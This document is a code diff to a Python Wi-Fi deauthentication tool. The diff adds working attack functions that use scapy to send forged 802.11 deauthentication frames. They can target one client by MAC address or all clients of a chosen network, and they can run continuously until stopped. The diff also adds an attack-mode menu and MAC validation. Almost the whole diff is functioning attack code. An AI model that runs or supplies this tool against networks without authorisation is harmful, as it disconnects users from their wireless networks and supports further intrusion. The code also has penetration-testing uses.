@@ -14,6 +14,7 @@ import os
 import subprocess
 import signal
 import platform
+import re
 
 try:
     from scapy.all import sniff, sendp
@@ -299,7 +300,7 @@ def scan_networks(interface):
         print("[-] No networks found!")
         sys.exit(1)
 
-    os.system("clear")  # Clear screen after scanning
+    os.system("clear")
     print("\n[+] Available Networks:\n")
     print("{:<5} {:<25} {:<10} {:<10} {:<20}".format("No", "ESSID", "Power", "Channel", "BSSID"))
     print("{:<5} {:<25} {:<10} {:<10} {:<20}".format("-"*5, "-"*25, "-"*10, "-"*10, "-"*20))
@@ -327,12 +328,59 @@ def parse_packet(packet, networks, channel):
     except Exception as e:
         print(f"[-] Error parsing packet: {e}")
 
-def deauth_attack(interface, bssid, channel, count):
-    """Perform a deauthentication attack on the specified BSSID."""
+def deauth_single_client(interface, bssid, client_mac, channel, count):
+    """Perform a deauthentication attack on a specific client."""
     try:
         if not os.path.exists(f"/sys/class/net/{interface}"):
             raise ValueError(f"Interface '{interface}' not found or no longer exists.")
-        print(f"[*] Starting deauth attack on {bssid} (Channel {channel})...")
+        print(f"[*] Starting deauth attack on client {client_mac} connected to {bssid} (Channel {channel})...")
+        result = subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
+        if result.returncode != 0:
+            raise RuntimeError(f"Failed to set channel {channel}: {result.stderr}")
+        
+        packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
+        
+        if count == 0:
+            print("[*] Sending continuous deauth packets...")
+            print("[*] Press 'Ctrl + C' to stop.")
+            while True:
+                sendp(packet, iface=interface, verbose=False)
+                time.sleep(0.1)
+        else:
+            print(f"[*] Sending {count} deauth packets...")
+            sendp(packet, iface=interface, count=count, verbose=False)
+        
+        print("[+] Deauth attack completed")
+    except ValueError as e:
+        print(f"[-] Error: {e}")
+        sys.exit(1)
+    except RuntimeError as e:
+        print(f"[-] Error: {e}")
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print("\n[*] Deauth attack stopped by user")
+        raise
+    except Exception as e:
+        print(f"[-] Error during deauth attack: {e}")
+        sys.exit(1)
+    finally:
+        try:
+            choice = input("[#] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
+            if choice == 'y':
+                restore_managed_mode(interface)
+            else:
+                print("[*] Interface left in current mode")
+        except KeyboardInterrupt:
+            print("\n[-] KeyboardInterrupt")
+        except Exception as e:
+            print(f"[-] Error handling restore choice: {e}")
+
+def deauth_all_clients(interface, bssid, channel, count):
+    """Perform a deauthentication attack on all clients of a network."""
+    try:
+        if not os.path.exists(f"/sys/class/net/{interface}"):
+            raise ValueError(f"Interface '{interface}' not found or no longer exists.")
+        print(f"[*] Starting deauth attack on all clients of {bssid} (Channel {channel})...")
         result = subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
         if result.returncode != 0:
             raise RuntimeError(f"Failed to set channel {channel}: {result.stderr}")
@@ -374,31 +422,11 @@ def deauth_attack(interface, bssid, channel, count):
         except Exception as e:
             print(f"[-] Error handling restore choice: {e}")
 
-def get_valid_channel():
-    """Get a valid channel input from the user (1-14)."""
-    while True:
-        try:
-            channel = input("[#] Enter target channel (1-14): ").strip()
-            channel = int(channel)
-            if channel < 1 or channel > 14:
-                print("[-] Error: Channel must be between 1 and 14!")
-                continue
-            print(f"[+] Channel {channel} selected")
-            return channel
-        except ValueError:
-            print("[-] Error: Invalid input! Channel must be a number between 1 and 14.")
-        except KeyboardInterrupt:
-            print("\n[-] KeyboardInterrupt")
-            sys.exit(1)
-        except Exception as e:
-            print(f"[-] Unexpected error with channel input: {e}")
-            sys.exit(1)
-
 def get_valid_target(networks):
     """Get a valid target number from the user for deauthentication."""
     while True:
         try:
-            target_num = input("[#] Enter target number to deauth: ").strip()
+            target_num = input("[#] Enter target network number: ").strip()
             target_num = int(target_num)
             if target_num < 1 or target_num > len(networks):
                 print(f"[-] Error: Please select a number between 1 and {len(networks)}!")
@@ -412,6 +440,24 @@ def get_valid_target(networks):
             sys.exit(1)
         except Exception as e:
             print(f"[-] Unexpected error with target selection: {e}")
+            sys.exit(1)
+
+def get_valid_mac():
+    """Get and validate a MAC address input from the user."""
+    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
+    while True:
+        try:
+            mac = input("[#] Enter target client MAC address (xx:xx:xx:xx:xx:xx): ").strip()
+            if not re.match(mac_pattern, mac):
+                print("[-] Error: Invalid MAC address format! Use xx:xx:xx:xx:xx:xx")
+                continue
+            print(f"[+] Target client MAC {mac} selected")
+            return mac
+        except KeyboardInterrupt:
+            print("\n[-] KeyboardInterrupt")
+            sys.exit(1)
+        except Exception as e:
+            print(f"[-] Unexpected error with MAC input: {e}")
             sys.exit(1)
 
 def get_valid_packet_count():
@@ -434,16 +480,47 @@ def get_valid_packet_count():
             print(f"[-] Unexpected error with packet count input: {e}")
             sys.exit(1)
 
+def get_attack_mode_choice():
+    """Display attack modes and get user choice."""
+    attack_modes = [
+        {"mode": "Single Client Attack (specific MAC)"},
+        {"mode": "All Clients Attack (broadcast)"}
+    ]
+    
+    print("\n[+] Available Attack Modes:\n")
+    print("{:<5} {:<35}".format("No", "Attack Mode"))
+    print("{:<5} {:<35}".format("-"*5, "-"*35))
+    for i, mode in enumerate(attack_modes):
+        print("{:<5} {:<35}".format(i+1, mode['mode']))
+    print("")
+
+    while True:
+        try:
+            choice = input("[#] Enter attack mode number: ").strip()
+            choice = int(choice)
+            if choice < 1 or choice > len(attack_modes):
+                print(f"[-] Error: Please select a number between 1 and {len(attack_modes)}!")
+                continue
+            print(f"[+] Selected mode: {attack_modes[choice - 1]['mode']}")
+            return choice
+        except ValueError:
+            print("[-] Error: Invalid input! Please enter a number.")
+        except KeyboardInterrupt:
+            print("\n[-] KeyboardInterrupt")
+            sys.exit(1)
+        except Exception as e:
+            print(f"[-] Unexpected error with mode selection: {e}")
+            sys.exit(1)
+
 def main():
     """Main function to run the Wi-Fi deauthentication tool."""
     try:
-        # Set up signal handler for cleaner exit on Ctrl+C
         signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(1))
         
-        os.system("clear")  # Clear screen at startup
+        os.system("clear")
         print_banner()
         
-        check_os()  # Check if OS is Linux
+        check_os()
         check_root_privileges()
         check_requirements()
 
@@ -458,10 +535,16 @@ def main():
         networks = scan_networks(interface)
         target = get_valid_target(networks)
         
-        channel = get_valid_channel()
-        count = get_valid_packet_count()
+        mode = get_attack_mode_choice()
+        
+        if mode == 1:  # Single Client
+            client_mac = get_valid_mac()
+            count = get_valid_packet_count()
+            deauth_single_client(interface, target['bssid'], client_mac, target['channel'], count)
+        else:  # mode == 2, All Clients
+            count = get_valid_packet_count()
+            deauth_all_clients(interface, target['bssid'], target['channel'], count)
 
-        deauth_attack(interface, target['bssid'], channel, count)
     except KeyboardInterrupt:
         print("\n[-] KeyboardInterrupt")
         sys.exit(1)
